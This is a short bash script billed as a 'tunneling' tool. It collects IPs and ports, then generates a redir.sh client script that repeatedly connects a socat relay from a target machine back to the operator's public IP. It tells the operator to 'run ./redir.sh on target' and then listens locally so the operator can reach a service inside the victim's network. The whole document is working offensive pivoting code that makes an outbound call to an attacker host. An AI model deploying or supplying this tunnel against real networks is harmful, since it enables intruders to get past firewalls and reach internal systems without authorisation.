#!/bin/bash
echo "##### SPRAWL (TUNNELING) - Lil D1x #####"
echo "#################################################################"
echo " Type the port to open on your machine: "
echo "#################################################################"
read open
echo "#################################################################"
echo " Type the port tha will be used to access the local service: "
echo "#################################################################"
read lservice
echo "#################################################################"
echo " Type your Public IP: "
echo "#################################################################"
read ipplubic
echo "#################################################################"
echo " Type the IP where the service is running: "
echo "#################################################################"
read ipservice
echo "#################################################################"
echo " Type the port where the service is running"
echo "#################################################################"
read serviceport
echo "#################################################################"
echo " Generating script to run on client........ "
touch redir.sh
echo "#!/bin/bash" > redir.sh
echo "while true;" >> redir.sh
echo "do" >> redir.sh
echo "socat TCP4:$ipplubic:$open TCP4:$ipservice:$serviceport;" >> redir.sh
echo "done" >> redir.sh
echo " Successfully generated client script, run ./redir.sh on target... "
echo "#################################################################"
echo "#################################################################"
echo " Waiting for connection on port "$open
echo "#################################################################"
socat TCP4-LISTEN:$open,reuseaddr,fork TCP4-LISTEN:$lservice,reuseaddr
